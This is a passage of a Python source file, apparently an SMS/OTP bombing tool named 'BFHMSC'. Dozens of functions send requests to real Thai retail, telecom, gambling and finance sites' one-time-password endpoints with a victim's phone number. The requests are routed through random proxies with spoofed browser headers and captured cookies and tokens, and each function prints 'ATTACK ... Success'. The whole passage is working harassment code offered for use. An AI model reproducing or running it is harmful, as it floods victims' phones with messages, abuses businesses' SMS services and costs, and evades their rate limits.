	r = requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi13(phone):
	r = requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi14(phone):
	r = requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi15(phone):
	r = requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi16(phone):
	r = requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi17(phone):
	r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

#OLD API	
def bfhmscapi1(phone):
	r = requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API TRUECORP STATUS API {r}")))

def bfhmscapi2(phone):
	r = requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS BIGC STATUS API {r}")))

def bfhmscapi3(phone):
	r = requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API FOX87 STATUS API {r}")))

def bfhmscapi4(phone):
	r = requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API TRUEMOVEH STATUS API {r}")))

def bfhmscapi5(phone):
	r = requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 1112 STATUS API {r}")))

def bfhmscapi6(phone):
	r = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 1112 STATUS API {r}")))

def bfhmscapi7(phone):
	r = requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API VEGAS STATUS API {r}")))

def bfhmscapi8(phone):
	r = requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API AUTO1 STATUS API {r}")))

def bfhmscapi9(phone):
	r = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API COGNITO STATUS API {r}")))

def bfhmscapi10(phone):
	r = requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}")
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API KAMUI STATUS API {r}")))
	
def bfhmscapi11(phone):
	r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API NOCNOC STATUS API {r}")))

def bfhmscapi12(phone):
	r = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API ISHIP STATUS API {r}")))

def bfhmscapi13(phone):
	r = requests.post("https://m-api.hhh-st1.xyz/api/otp/register",headers={"content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"applicant":phone,"serviceName":"hihuay.com"})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API ST1 STATUS API {r}")))

def bfhmscapi14(phone):
	r = requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API BEAUTICOOL STATUS API {r}")))

def bfhmscapi15(phone):
	r = requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API XN24 STATUS API {r}")))

def bfhmscapi16(phone):
	r = requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API GIZTIX STATUS API {r}")))

def bfhmscapi17(phone):
	r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API LOTUS STATUS API {r}")))

def bfhmscapi18(phone):
	r = requests.post("https://mapi.dung919.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"dung919.com"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API DUNG919 STATUS API {r}")))

def bfhmscapi19(phone):
	r = requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API CMTRADE STATUS API {r}")))

def bfhmscapi20(phone):
	r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API CARSOME STATUS API {r}")))

def bfhmscapi21(phone):
	r = requests.post("https://api.yellowtire.com/api/user/request-otp",headers={"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"tel":phone},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API YELLOW STATUS API {r}")))

def bfhmscapi22(phone):
	r = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 1112 STATUS API {r}")))

def bfhmscapi23(phone):
	r = get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API KS STATUS API {r}")))

def bfhmscapi24(phone):
	r = requests.post("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API QUICKCASH8 STATUS API {r}")))

def bfhmscapi25(phone):
	r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API SHOPPING STATUS API {r}")))

def bfhmscapi26(phone):
	r = requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API MOMCLUB STATUS API {r}")))

def bfhmscapi27(phone):
	r = requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",json={"phoneNumber":"+66"+phone},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API GLOBAL STATUS API {r}")))

def bfhmscapi28(phone):
	r = requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API FRESHKET STATUS API {r}")))

def bfhmscapi29(phone):
	r = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API PYGW STATUS API {r}")))

def bfhmscapi30(phone):
	session = Session()
	r = requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API KONVY STATUS API {r}")))

def bfhmscapi31(phone):
	session = Session()
